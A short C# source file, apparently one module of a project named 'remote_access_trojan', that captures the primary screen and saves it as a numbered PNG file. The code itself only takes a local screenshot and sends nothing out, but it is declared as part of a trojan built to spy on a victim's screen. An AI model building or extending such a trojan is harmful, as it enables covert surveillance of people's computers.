using System;
using System.Collections.Generic;
using System.Text;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using System.Threading.Tasks;
using System.Linq;



namespace remote_access_trojan
{
    class Screenshot
    {
        public static void takeScreenshot(int i)
        {
            // Create Bitmap image to store screenshot in
            Bitmap image;
            
            // Bitmap is the size of the entire screen + task bar (Make sure your DPI is at 100%) 
            image = new Bitmap(Screen.PrimaryScreen.Bounds.Width,Screen.PrimaryScreen.Bounds.Height);


            using (Graphics g = Graphics.FromImage(image))
            {
                // Copy the bytes from the screen 
                g.CopyFromScreen(0, 0, 0, 0, Screen.PrimaryScreen.Bounds.Size);
                
            }

            // Save screenshot into file on Computer 
            string str = "";
            try
            {
                str = Path.Combine(Directory.GetCurrentDirectory(), "screenshot" + i +".png");
            }
            catch (Exception er)
            {
                Console.WriteLine("Sorry, there was an error: " + er.Message);
                Console.WriteLine();
            }

            // Save the image
            image.Save(str);

        }
    }
}
 